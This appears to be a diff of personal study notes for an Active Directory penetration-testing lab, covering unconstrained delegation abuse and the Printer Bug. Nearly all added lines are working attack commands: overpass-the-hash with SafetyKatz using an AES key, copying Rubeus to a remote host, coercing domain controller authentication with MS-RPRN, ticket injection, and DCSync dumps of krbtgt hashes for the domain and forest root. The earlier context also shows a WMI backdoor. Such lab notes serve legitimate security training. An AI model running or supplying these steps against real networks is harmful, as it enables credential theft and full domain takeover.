@@ -34,3 +34,50 @@ WMI
 ->  . C:\AD\Tools\RACE.ps1
 -> Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 -> gwmi -class win32_operatingsystem -ComputerName dcorp-dc
+
+•Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
+• Compromise the server and escalate to Domain Admin privileges. 
+• Escalate to Enterprise Admins privileges by abusing Printer Bug!
+
+From cmd:
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+-> . C:\AD\Tools\PowerView.ps1
+-> Get-DomainComputer -Unconstrained | select -ExpandProperty
+
+First, we will try with appadmin. Run the below command from an elevated command prompt:
+-> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local 
+/aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb 
+/run:cmd.exe" "exit"
+
+Run the below commands in the new process:
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+-> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+->  Find-PSRemotingLocalAdminAccess
+
+Sweet! We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug!
+Printer Bug - Copy Rubeus using xcopy and execute using winrs
+Run the below command from the process running appadmin:
+=> echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorpappsrv\C$\Users\Public\Rubeus.exe /Y
+-> winrs -r:dcorp-appsrv cmd
+-> C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
+
+On the student VM, use MS-RPRN to force authentication from dcorp-dc$
+-> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+. Run the below command from an elevated shell 
+-> C:\AD\Tools\Rubeus.exe ptt /ticket:doIFx…
+-> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
+Escalation to Enterprise Admins
+-> winrs -r:dcorp-appsrv cmd
+-> C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ 
+/interval:5 /nowrap
+Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv:
+-> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorpappsrv.dollarcorp.moneycorp.local
+DCSync needs to be 
+run from an elevated process:
+-> C:\AD\Tools\Rubeus.exe ptt /ticket:doIFx…
+-> >C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+
+
+
